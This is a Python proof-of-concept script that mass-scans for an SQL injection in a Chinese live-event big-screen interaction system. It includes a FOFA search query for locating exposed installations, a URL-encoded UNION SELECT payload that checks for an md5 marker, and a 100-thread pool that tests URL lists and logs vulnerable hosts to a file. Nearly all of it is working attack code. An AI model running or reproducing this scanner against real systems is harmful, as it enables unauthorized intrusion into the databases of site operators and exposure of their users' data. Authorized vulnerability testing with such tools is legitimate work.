import argparse,requests,sys,re
from multiprocessing.dummy import Pool

#fofa语句 body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统" || body="/Modules/module.php?m=importlottery"||title="微信上墙首页"&&body="/wall/index.php"|| header="/frame.php"

def banner():
    test = """"""
    print(test)

def poc(target):
    payload = "/Modules/module.php?m=importlottery&c=admin&a=index&txt=%25%22%29%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%6d%64%35%28%31%29%2c%35%23"
    # 目标主机拒绝链接 -- 程序后续的会停止
    try:
        res1 = requests.get(url=target,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,timeout=5)
            # print(res2.text)
            if re.search(r"c4ca4238a0b923820dcc509a6f75849b", res2.text):
                print(f"[+]{target}存在sql注入漏洞")
                with open('result3.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]{target}不存在sql注入")
        else:
            print(f"[*]{target}访问有问题，请手工检查")
    except:
        pass

def main():
    banner()
    # 第一个处理用户输入的参数
    parse = argparse.ArgumentParser(description="金华迪加 现场大屏互动系统index存在SQL注入")

    # 添加命令行的参数
    parse.add_argument('-u','--url',dest='url',type=str,help="please input your link")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input your file path")

    # 实例化
    args = parse.parse_args()

    # 判断用户输入
    if args.url and not args.file:
        # 开始测试
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usage: Python {sys.argv[0]} -h")

# 程序的入口
if __name__ == "__main__":
    main()